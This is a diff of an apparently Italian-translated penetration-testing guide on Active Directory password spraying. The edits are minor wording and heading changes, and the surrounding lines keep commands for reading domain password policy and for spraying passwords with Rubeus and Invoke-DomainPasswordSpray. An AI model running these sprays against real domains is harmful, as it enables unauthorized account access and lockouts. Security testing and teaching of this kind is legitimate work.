@@ -10,9 +10,9 @@ Per **default**, la **lunghezza minima** della **password** è **7**.
 
 Le liste di nomi utente comuni potrebbero essere utili: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)
 
-Nota che **potresti bloccare alcuni account se provi diverse password errate** (per impostazione predefinita più di 10).
+Nota che **potresti bloccare alcuni account se provi diverse password errate** (per default più di 10).
 
-### Ottieni la politica delle password
+### Get password policy
 
 Se hai alcune credenziali utente o una shell come utente di dominio, puoi **ottenere la politica delle password con**:
 ```bash
@@ -31,7 +31,7 @@ net accounts
 
 (Get-DomainPolicy)."SystemAccess" #From powerview
 ```
-### Sfruttamento da Linux (o da tutti)
+### Exploitation from Linux (or all)
 
 - Utilizzando **crackmapexec:**
 ```bash
@@ -78,7 +78,7 @@ done
 .\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
 ```
 - Con [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (Può generare utenti dal dominio per impostazione predefinita e otterrà la politica delle password dal dominio e limiterà i tentativi in base ad essa):
-```powershell
+```bash
 Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
 ```
 - Con [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1)
